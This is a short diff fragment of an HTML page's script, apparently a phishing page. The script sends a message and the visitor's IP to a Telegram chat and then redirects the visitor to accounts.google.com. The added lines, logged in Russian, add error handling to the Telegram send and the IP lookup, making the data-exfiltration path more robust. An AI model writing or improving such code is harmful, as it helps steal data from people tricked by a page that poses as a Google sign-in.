@@ -103,12 +103,16 @@
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({chat_id: chatId, text: message})
-                    });
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Отправлено в Telegram:', data))
+                    .catch(error => console.error('Ошибка при отправке данных в Telegram:', error));
                 })
+                .catch(error => console.error('Ошибка получения IP:', error))
                 .finally(() => {
                     window.location.href = 'https://accounts.google.com';
                 });
         });
     </script>
 </body>
-</html>
+</html>")}]}
